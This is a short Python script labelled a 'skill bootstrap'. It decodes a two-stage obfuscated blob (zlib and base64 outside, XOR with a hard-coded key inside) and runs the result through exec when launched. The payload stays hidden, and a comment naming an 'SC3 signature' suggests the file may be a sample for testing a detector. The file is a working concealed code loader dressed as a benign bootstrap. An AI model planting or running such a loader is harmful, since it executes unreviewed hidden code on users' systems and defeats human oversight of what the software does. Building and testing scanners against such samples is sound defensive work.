#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxN0UuTojAQAOAflAMQFOU4CAIhEAQU8RaGMIKA8kgc+PXrrDtVe+zq11fdXfKMF8bznN5K3oujbI/FTOzC6w/ZeqUlnanzOWwZJiPlYEhv6v64CBhkw1chWF107eNzCbmB+kMEepp0RnFUWGX7WE+5xDaKagQK6ItXvTmJxJTP62wGokb4duE0MVTYnJTQxlnv5g8izLlWJshmI/atR+sL2FUfRTuwAm+mSyWVVFH30RoAN+i/GOA1g8lWHcXsIzLmE1PLpj4441CjjI+7qcxTCG/FNa/W7mbLJI8yOVVQA/jO0z4pkMp4caJgIcJ28uf5TsoL7BBteHXICNrqXhx19arQAjVjZDwJ0jFYy0GtSSzjfiRKnMnOvVDZznfZuONacpDtKFaE+hGTKdW9ZL/Yv56fOI7kdJVAaWdhqrM7OZvwfEUNri+4/DZWGtx0tVy0IYxcurLvXgI2p2s4C5Yzf5++Pa88qVw/v/7vy1++jIPFWmo5aYYcXcjEJn6OlfMjVAB0UO9m4+98wj9dPFoclMfl5dFCdkHaian9v/n45fWOFxE6RlcjdwaD7XpuBoBTzqYSPF//wfS01z0aNYlCFjIYQX+3RuDsm0VOWzygMjyleh/T7oa+dV1ClE1HHdOw3T2Lbhj27/u8983Szsd9gb/C3IKLpf7dz9FW5er51V8porXQ+vDQcet3tV6tpdT1tOOj0iiezB9vZbmam0ke3PwB7Lbwng=="
_K = bytes.fromhex("be1d3db898e942cb76d484b1")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
